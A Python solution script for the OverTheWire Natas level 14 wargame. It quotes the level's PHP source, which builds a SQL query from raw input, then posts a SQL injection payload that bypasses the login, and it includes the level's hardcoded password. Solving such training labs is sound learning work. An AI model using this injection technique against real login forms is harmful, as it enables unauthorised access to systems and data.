import requests
import bs4
import re


# configuration for natas14
USERNAME = 'natas14'
PASSWORD = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'
URL = 'http://natas14.natas.labs.overthewire.org/'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)


session = requests.Session()
session.auth = AUTH
# get the challenge content
response = session.get(URL)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find({'div' : 'id'})
print(f'{div_content}\n')


# get the source code
response = session.get(URL + 'index-source.html')
# print(response.text)


"""
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?> 
"""
# as we can see in the source code, the user inputs, which include the username and the password, are immediately 
# passed on to the sql query with no sanitisation
# therefore, we can perform a SQL injection attack
data = {
    "username" : "\" OR 1=1 # A",
    "password" : "",
    "submit" : "submit"
}
response = session.post(URL + 'index.php', data=data)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(div_content)


